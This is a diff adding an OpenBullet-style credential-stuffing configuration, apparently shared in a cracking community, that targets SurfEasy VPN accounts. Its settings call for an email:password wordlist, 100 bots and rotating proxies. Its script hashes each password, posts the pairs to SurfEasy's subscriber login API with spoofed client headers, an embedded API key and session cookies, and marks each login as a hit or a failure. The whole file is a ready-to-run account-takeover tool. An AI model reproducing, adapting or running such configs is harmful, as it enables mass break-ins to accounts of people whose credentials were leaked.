@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "SurfEasy VPN ",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-04T17:05:16.0846932+04:30",
+  "AdditionalInfo": "",
+  "Author": "\"The_FiendQQ\"",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#HashPASS FUNCTION Hash SHA1 "<PASS>" -> VAR "HashPASS" 
+
+#Length FUNCTION Length "login=<USER>&password=<HashPASS>" -> VAR "Length" 
+
+#Login REQUEST POST "https://api.surfeasy.com/v2/subscriber_login.json" 
+  CONTENT "login=<USER>&password=<HashPASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Origin: https://accounts.surfeasy.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) SurfEasy VPN Safari/538.1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Referer: https://accounts.surfeasy.com/onboarding?affiliate_id=&locale=en&view=Landing" 
+  HEADER "Access-Control-Allow-Credentials: true" 
+  HEADER "SE-Client-Type: se0211" 
+  HEADER "SE-Client-Name: SurfEasy VPN" 
+  HEADER "SE-Client-Version: 3.13.41" 
+  HEADER "SE-Operating-System: Microsoft Windows 8 Enterprise Edition  (build 9200), 64-bit" 
+  HEADER "SE-Platform-ID: win-x86-32" 
+  HEADER "SE-Client-Locale: en" 
+  HEADER "SE-Client-API-Key: 45C51375B2393D48DCADCF49E65028CBAD85F705FDFE2D236E8852F9E260513E" 
+  HEADER "Cookie: __cfduid=dd56e180d4fe70e1e17afec94f9f78cab1588066477; optimizelySegments=%7B%224503002423%22%3A%22safari%22%2C%224480692664%22%3A%22false%22%2C%224520452327%22%3A%22direct%22%7D; optimizelyBuckets=%7B%7D; _ga=GA1.2.1378000493.1588066483; _gid=GA1.2.1827799929.1588066483; mp_de900acf60d05b0ab46433c6d8eaf750_mixpanel=%7B%22distinct_id%22%3A%20%22171c0237a3324-0ef9e62cc-2939423f-1aeaa0-171c0237a348f%22%2C%22%24device_id%22%3A%20%22171c0237a3324-0ef9e62cc-2939423f-1aeaa0-171c0237a348f%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; _fbp=fb.1.1588066489192.1401251270; optimizelyEndUserId=oeu1588066479660r0.22192621673457325; _proxy_manager_session31=U1dCb1V0c2YrVk11TlBIVSs0V3dqWjk0UVc2WVAvRUdpMUlUdXpTMUhsaVArYjAzTjlUaEo1ekJnd3BvdGxBVjM2ckFJaU5tVk8vY21mVHVsQy9oUkM1aWtNb1hpQWlYS2VER2VYVDdQZWNlVmVNY2xSNXVlTXZIc1RLN2Jkd2RpRWJSdXNUazZpQUxnWFJZanZiMDBRPT0tLVc4d1ptcW9UTFZJUXFtVkU2U0dWb2c9PQ%3D%3D--0a62d0dd1bc5908e9ac06988f0ce54e2314ecc37" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Language: en-US,*" 
+  HEADER "Host: api.surfeasy.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <Lenght>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login failed.\"" 
+  KEYCHAIN Success OR 
+    KEY "account_code" 
+
